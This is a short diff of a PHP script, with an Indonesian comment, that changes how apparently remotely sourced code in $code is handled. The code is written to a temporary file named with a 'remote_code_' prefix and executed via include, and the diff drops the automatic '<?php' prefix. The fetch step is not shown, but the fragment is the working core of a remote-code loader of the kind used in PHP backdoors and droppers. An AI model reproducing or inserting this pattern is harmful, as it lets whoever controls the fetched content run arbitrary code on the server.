@@ -37,11 +37,7 @@ if ($code !== false) {
     try {
         ob_start();
         
-
-        if (strpos($code, '<?php') === false) {
-            $code = "<?php\n" . $code;
-        }
-        
+        // Tulis kode apa adanya ke file sementara tanpa menambahkan <?php
         $tempFile = tempnam(sys_get_temp_dir(), 'remote_code_');
         file_put_contents($tempFile, $code);
         include $tempFile;
